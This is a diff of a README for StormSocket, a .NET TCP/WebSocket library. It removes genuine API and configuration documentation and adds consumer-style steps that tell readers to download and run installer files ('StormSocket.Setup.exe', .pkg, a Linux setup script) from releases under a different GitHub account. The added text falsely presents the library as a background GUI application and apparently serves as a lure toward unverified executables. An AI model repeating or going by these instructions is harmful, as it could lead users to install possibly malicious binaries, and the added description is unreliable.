-| `Framer` | `IMessageFramer?` | `null` | Message framing strategy |
-| `ConnectTimeout` | `TimeSpan` | `10s` | Connection timeout |
-| `Socket` | `SocketTuningOptions` | `new()` | Low-level TCP socket tuning (NoDelay, KeepAlive, backpressure limits) |
-| `Reconnect` | `ReconnectOptions` | `new()` | Auto-reconnect settings |
-
-## WsClientOptions
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `Uri` | `Uri` | `ws://localhost:8080` | WebSocket URI (`ws://` or `wss://`) |
-| `ConnectTimeout` | `TimeSpan` | `10s` | Connection timeout |
-| `MaxFrameSize` | `int` | `1048576` | Maximum frame payload (bytes) |
-| `Headers` | `Dictionary<string, string>?` | `null` | Extra HTTP headers for upgrade |
-| `Ssl` | `ClientSslOptions?` | `null` | SSL/TLS configuration |
-| `Socket` | `SocketTuningOptions` | `new()` | Low-level TCP socket tuning (NoDelay, KeepAlive, backpressure limits) |
-| `Heartbeat` | `HeartbeatOptions` | `new()` | Ping/pong heartbeat and dead connection detection settings |
-| `Reconnect` | `ReconnectOptions` | `new()` | Auto-reconnect settings |
-
-## SocketTuningOptions
-
-Shared by `ServerOptions`, `ClientOptions`, and `WsClientOptions`.
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `NoDelay` | `bool` | `false` | Disable Nagle's algorithm for lower latency |
-| `KeepAlive` | `bool` | `true` | Enable TCP Keep-Alive to prevent idle connections from being dropped by firewalls/NATs |
-| `MaxPendingSendBytes` | `long` | `1048576` | Max bytes buffered before send backpressure (0 = unlimited) |
-| `MaxPendingReceiveBytes` | `long` | `1048576` | Max bytes buffered before receive backpressure (0 = unlimited) |
-
-## HeartbeatOptions
-
-Shared by `WebSocketOptions` (server) and `WsClientOptions` (client).
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `PingInterval` | `TimeSpan` | `30s` | Interval between Ping frames (`TimeSpan.Zero` = disabled) |
-| `MaxMissedPongs` | `int` | `3` | Consecutive missed Pongs before closing |
-| `AutoPong` | `bool` | `true` | Automatically reply to incoming Ping frames with a Pong |
-
-## ReconnectOptions
-
-Shared by `ClientOptions` and `WsClientOptions`.
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `Enabled` | `bool` | `false` | Enable automatic reconnection on disconnect |
-| `Delay` | `TimeSpan` | `2s` | Delay between reconnect attempts |
-| `MaxAttempts` | `int` | `0` | Max reconnection attempts (0 = unlimited) |
-
-## SslOptions
-
-| Property | Type | Default | Description |
-|---|---|---|---|
-| `Certificate` | `X509Certificate2` | *(required)* | Server certificate |
-| `Protocols` | `SslProtocols` | `Tls12 \| Tls13` | Allowed TLS protocol versions |
-| `ClientCertificateRequired` | `bool` | `false` | Require client certificate |
-
-# API Reference
-
-## ISession
-
-```csharp
-public interface ISession : IAsyncDisposable
-{
-    long Id { get; }                      // Unique auto-incrementing ID
-    ConnectionState State { get; }        // Connected, Closing, Closed
-    ConnectionMetrics Metrics { get; }    // BytesSent, BytesReceived, Uptime
-    bool IsBackpressured { get; }         // True when send buffer is full
-    IReadOnlySet<string> Groups { get; }  // Group memberships
-
-    ValueTask SendAsync(ReadOnlyMemory<byte> data, CancellationToken ct = default);
-    ValueTask CloseAsync(CancellationToken ct = default);
-    void Abort();
-    void JoinGroup(string group);
-    void LeaveGroup(string group);
-}
-```
-
-## WebSocketSession
-
-Extends ISession with WebSocket-specific methods:
-
-```csharp
-// Text frame from string
-await session.SendTextAsync("Hello!");
-
-// Text frame from pre-encoded UTF-8 (zero-copy)
-await session.SendTextAsync(utf8Bytes);
-
-// Binary frame
-await session.SendAsync(binaryData);
-
-// Close with status
-await session.CloseAsync();
-```
-
-## SessionManager
-
-```csharp
-server.Sessions.Count;                              // Current count
-server.Sessions.All;                                 // IEnumerable<ISession>
-server.Sessions.TryGet(id, out ISession? session);   // Lookup by ID
-server.Sessions.BroadcastAsync(data);                // Send to all
-server.Sessions.CloseAllAsync();                     // Graceful shutdown
-```
-
-## SessionGroup
-
-```csharp
-server.Groups.Add("room", session);                  // Join
-server.Groups.Remove("room", session);               // Leave
-server.Groups.RemoveFromAll(session);                // Leave all (on disconnect)
-server.Groups.BroadcastAsync("room", data);          // Send to room
-server.Groups.MemberCount("room");                   // Count
-server.Groups.GroupNames;                             // All room names
-```
-
-## StormTcpClient
-
-```csharp
-var client = new StormTcpClient(options);
-
-// Events
-client.OnConnected += async () => { };
-client.OnDisconnected += async () => { };
-client.OnDataReceived += async (ReadOnlyMemory<byte> data) => { };
-client.OnError += async (Exception ex) => { };
-client.OnReconnecting += async (int attempt, TimeSpan delay) => { };
-
-// Lifecycle
-await client.ConnectAsync(ct);             // Connect (with optional CancellationToken)
-await client.SendAsync(data, ct);          // Send data
-await client.DisconnectAsync(ct);          // Graceful disconnect
-await client.DisposeAsync();               // Disconnect + cleanup
-
-// Properties
-client.State;                              // ConnectionState (Connecting, Connected, Closing, Closed)
-client.Metrics.BytesSent;                  // Total bytes sent
-client.Metrics.BytesReceived;              // Total bytes received
-client.Metrics.Uptime;                     // Connection uptime
-client.UseMiddleware(middleware);           // Add middleware
-```
-
-## StormWebSocketClient
-
-```csharp
-var ws = new StormWebSocketClient(options);
-
-// Events
-ws.OnConnected += async () => { };
-ws.OnDisconnected += async () => { };
-ws.OnMessageReceived += async (WsMessage msg) => { };
-ws.OnError += async (Exception ex) => { };
-ws.OnReconnecting += async (int attempt, TimeSpan delay) => { };
-
-// Lifecycle
-await ws.ConnectAsync(ct);                 // Connect + WebSocket upgrade
-await ws.SendTextAsync("hello", ct);       // Send text frame (masked)
-await ws.SendTextAsync(utf8Bytes, ct);     // Send pre-encoded text frame
-await ws.SendAsync(binaryData, ct);        // Send binary frame (masked)
-await ws.DisconnectAsync(ct);              // Send Close frame + disconnect
-await ws.DisposeAsync();                   // Disconnect + cleanup
-
-// Properties
-ws.State;                                  // ConnectionState
-ws.Metrics;                                // ConnectionMetrics
-ws.RemoteEndPoint;                         // Server endpoint
-ws.UseMiddleware(middleware);               // Add middleware
-```
-
-## IConnectionMiddleware
-
-```csharp
-public interface IConnectionMiddleware
-{
-    ValueTask OnConnectedAsync(ISession session);
-    ValueTask<ReadOnlyMemory<byte>> OnDataReceivedAsync(ISession session, ReadOnlyMemory<byte> data);
-    ValueTask<ReadOnlyMemory<byte>> OnDataSendingAsync(ISession session, ReadOnlyMemory<byte> data);
-    ValueTask OnDisconnectedAsync(ISession session);  // Called in reverse order
-    ValueTask OnErrorAsync(ISession session, Exception exception);
-}
-```
-
-All methods have default no-op implementations.
-
-## Message Framers
-
-| Framer | Format | Use Case |
-|---|---|---|
-| `RawFramer` | No framing, pass-through | Raw TCP streams |
-| `LengthPrefixFramer` | `[4-byte BE length][payload]` | Binary protocols |
-| `DelimiterFramer` | `[payload][delimiter]` (default: `\n`) | Text protocols, line-based |
-| Custom `IMessageFramer` | Your format | Custom protocols |
-
-## WsMessage
-
-```csharp
-public readonly struct WsMessage
-{
-    ReadOnlyMemory<byte> Data { get; }  // Raw payload
-    bool IsText { get; }                // True = Text frame, False = Binary
-    string Text { get; }                // UTF-8 decode (throws if !IsText)
-}
-```
-
-# How It Works
-
-## Connection Lifecycle
-
-**Server-side:**
-```
-Client connects
-    │
-    ├─ Socket.AcceptAsync
-    ├─ TcpTransport created (Pipe pair with backpressure limits)
-    ├─ SSL handshake (if SslOptions configured)
-    ├─ WebSocket HTTP upgrade (if StormWebSocketServer)
-    ├─ Session created, added to SessionManager
-    ├─ Middleware.OnConnectedAsync
-    ├─ OnConnected event
-    │
-    ├─ Read loop (receives frames/data, dispatches events)
-    ├─ Heartbeat loop (sends Pings, tracks Pongs) [concurrent]
-    │
-    ├─ Connection closes (client disconnect / timeout / kick)
-    ├─ Middleware.OnDisconnectedAsync (reverse order)
-    ├─ OnDisconnected event
-    ├─ Session removed from SessionManager
-    └─ Transport disposed
-```
-
-**Client-side:**
-```
-ConnectAsync called
-    │
-    ├─ Socket.ConnectAsync (with timeout)
-    ├─ TcpTransport or SslTransport created
-    ├─ SSL handshake (if configured or wss://)
-    ├─ WebSocket HTTP upgrade (if StormWebSocketClient)
-    ├─ Middleware.OnConnectedAsync
-    ├─ OnConnected event
-    │
-    ├─ Read/frame loop (dispatches OnDataReceived / OnMessageReceived)
-    ├─ Heartbeat loop (WebSocket: sends masked Pings) [concurrent]
-    │
-    ├─ Connection closes (server disconnect / timeout / DisconnectAsync)
-    ├─ Middleware.OnDisconnectedAsync (reverse order)
-    ├─ OnDisconnected event
-    │
-    ├─ [Reconnect.Enabled = true]: wait Reconnect.Delay → OnReconnecting → retry
-    └─ Transport disposed
-```
-
-## Write Serialization
-
-All writes to a WebSocket connection are serialized through a per-session `SemaphoreSlim`:
-
-```
-session.SendTextAsync("hello")  ─┐
-heartbeat ping                   ├─→ _writeLock → PipeWriter → Socket
-auto-pong                       ─┘
-```
-
-This prevents frame interleaving when multiple sources write concurrently (user code, heartbeat timer, auto-pong handler).
-
-## Backpressure
-
-StormSocket uses `System.IO.Pipelines` with configurable `pauseWriterThreshold` and `resumeWriterThreshold`:
-
-```
-[Socket] → ReceivePipe (1MB limit) → [Frame Decoder] → [Event Handler]
-[Event Handler] → [Frame Encoder] → SendPipe (1MB limit) → [Socket]
-```
-
-When a pipe fills up:
-- **Receive pipe full**: `ReceiveAsync` pauses → OS TCP window closes → sender slows down
-- **Send pipe full**: `session.IsBackpressured = true` → `SlowConsumerPolicy` kicks in:
-  - `Wait`: `FlushAsync` awaits → caller waits → no memory growth
-  - `Drop`: `SendAsync` returns immediately → message discarded → no blocking
-  - `Disconnect`: `CloseAsync` fired → session removed → no slow consumer
-
-Resume happens at 50% of the threshold to avoid oscillation.
-
-**Broadcast is concurrent**: Each session's send runs in parallel. One slow session never blocks delivery to others, regardless of policy.
-
-# Building
-
-```bash
-git clone https://github.com/suleymanbyzt/StormSocket.git
-cd StormSocket
-dotnet build
-dotnet test
-```
-
-# Samples
-
-| Sample | Port | Description |
-|---|---|---|
-| `StormSocket.Samples.TcpEcho` | 5000 | TCP echo server, test with `telnet` |
-| `StormSocket.Samples.WsChat` | 8080 | WebSocket broadcast chat |
-| `StormSocket.Samples.SslEcho` | 5001 | SSL/TLS echo with self-signed cert |
-| `StormSocket.Samples.WsServer` | 8080 | Full-featured WS server with admin console, rooms, heartbeat |
-
-```bash
-dotnet run --project samples/StormSocket.Samples.TcpEcho
-dotnet run --project samples/StormSocket.Samples.WsChat
-dotnet run --project samples/StormSocket.Samples.SslEcho
-dotnet run --project samples/StormSocket.Samples.WsServer
-```
-
-# License
-
-MIT License - see [LICENSE](LICENSE) for details.
+3. Inside the latest release, find the file that matches your operating system. This might be named something like:
+
+   - `StormSocket.Setup.exe` for Windows
+   - `StormSocket.pkg` or `.dmg` for macOS
+   - `StormSocket.tar.gz` or similar for Linux
+
+4. Click the file to download it to your computer.
+
+5. After the download finishes, open the file to start installation.
+
+   - On Windows, this might open an installer. Follow the prompts to install.
+   - On macOS, double-click the file and drag the app to your Applications folder.
+   - On Linux, unpack the file and follow any included instructions, such as running a setup script.
+
+6. After installation, launch the StormSocket application from your Start menu, Applications folder, or wherever it installs.
+
+---
+
+## ⚙️ Using StormSocket
+
+Once installed, you can use the application to create connections quickly. The software includes a simple user interface that guides you through:
+
+- Setting up a new connection.
+- Choosing the connection type (TCP, WebSocket, or SSL).
+- Entering the address of the server or client you want to connect to.
+- Managing active connections easily.
+
+If you are not sure about some terms:
+
+- **TCP**: A common way computers send messages to each other reliably.
+- **WebSocket**: A connection often used in web applications for real-time communication.
+- **SSL/TLS**: Methods to keep your data private when you connect.
+
+StormSocket runs quietly in the background but gives notifications when connections start, stop, or have problems.
+
+---
+
+## 🔧 Troubleshooting
+
+If you have trouble running StormSocket, try the following:
+
+- Make sure your computer meets the system requirements listed above.
+- Verify that you have the correct .NET runtime installed.
+- Check your internet connection if you are connecting to an online server.
+- Restart the application or your computer.
+- If a firewall is active on your system, allow StormSocket to access the network.
+
+For detailed technical help, you can visit the main repository page or open an issue for assistance.
+
+---
+
+## 📂 About This Software
+
+StormSocket is built with modern .NET tools focusing on speed and reliability. It uses a framework called System.IO.Pipelines, which allows efficient data handling without slowing down your computer. This makes it suitable for real-time applications, such as chat programs, online games, or any tool that needs constant communication.
+
+---
+
+## 📚 Learn More
+
+You can find more details, including source code and updates, on the GitHub repository page:
+
+[StormSocket GitHub Repository](https://github.com/KATUTAIGA/StormSocket)
+
+---
+
+## 📞 Support & Feedback
+
+If you have questions or want to suggest improvements, you can contact the developers through the repository’s Issues page. The community around StormSocket helps keep it running smoothly and improving over time. Your input is welcome.
+
+---
+
+## 🔖 Related Topics
+
+StormSocket focuses on:
+
+- Network connections (TCP, WebSocket)
+- Security (SSL, TLS)
+- Real-time communication
+- High performance and efficiency
+- Client and server setups for TCP and WebSocket
+
+These features make it a versatile tool for many network tasks.
+
+---
+
+Thank you for using StormSocket. Visit the releases page to get started:
+
+[Download StormSocket Releases](https://github.com/KATUTAIGA/StormSocket/releases)
